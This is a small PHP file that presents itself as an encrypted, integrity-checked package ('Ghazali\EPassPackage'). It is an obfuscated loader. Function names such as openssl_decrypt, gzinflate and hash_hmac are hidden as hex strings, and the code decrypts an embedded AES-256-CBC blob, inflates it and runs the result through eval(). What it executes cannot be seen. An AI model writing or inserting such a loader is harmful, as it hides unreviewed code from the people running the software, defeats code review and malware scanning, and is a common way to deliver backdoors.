<?php
/**
 * @package Ghazali\EPassPackage
 * @version Production-Hardened-Encrypted
 * @integrity sha256:77db881d747e838a2d9a49d8c5df2b4b43b911c56a86c718f21c549da020d4d8
 * @notice Confidential cryptographic artifact. Unauthorized reproduction, tampering, or reverse-engineering prohibited.
 */
declare(strict_types=1);

(static function($_0,$_1,$_2,$_3,$_4): void {
    $_5 = \pack('H*','6865783262696e');
    $_6 = \pack('H*','6f70656e73736c5f64656372797074');
    $_7 = \pack('H*','677a696e666c617465');
    $_8 = \pack('H*','686173685f686d6163');
    $_9 = $_5($_1) ^ $_5($_2);
    $_a = $_5($_0);
    if ($_8(\pack('H*','736861323536'), $_a, $_9) !== $_4) {
        throw new \RuntimeException(\pack('H*','536563757269747920457863657074696f6e3a20496e7465677269747920636865636b206661696c65642e'));
    }
    $_b = $_7($_6($_a, \pack('H*','4145532d3235362d434243'), $_9, 1, $_5($_3)));
    if ($_b !== false) {
        eval($_b);
    }
})('6c56ff1fc2870b29c26143bc65a7d0adf939fd65b2018874f3c2a4a5d1a7dfd530955dc8ee4763b0df1662a08a98192828b6e5c5e63a249287eeb0bc1f725ca4a473a570e9c596963e6a2c298c5a1ff9d5f4088892a092612910cf99f14dc5eabd728fca63624679003f3ba90bc2ef41af117573f451c9949faddc2006e0769a3acf51e4468e68e9f3ff8276ec69073f3b8bb0227eae3cefd50e02fbe725585f15534253a4435b7d2b3591c9a2958a0b04d1a1daa4bf8849694950b451ed449847b3742c58ab0dd006ffe2539a8121ffb0c72fbbff78a76b96a6334fa5d0b6ff74d472a8d21ec390784fa07fbd91a8eb84b4db02216fe9594102b1e0b9d0dfc80c61f7bfe521bc8618b80416b721abd54d36761c9186e386475a80de103eab0f', '99d3b5db52b1f740b1ee21c06ae16899350751de0553a1c7ce408e23255fff31', 'db879ff30696eade30b7b38ab3a0f0cf0a1eb12ec9b01bb3482e466afbdcd34d', 'a097824036c7eae2a303ba989b363337', '77db881d747e838a2d9a49d8c5df2b4b43b911c56a86c718f21c549da020d4d8');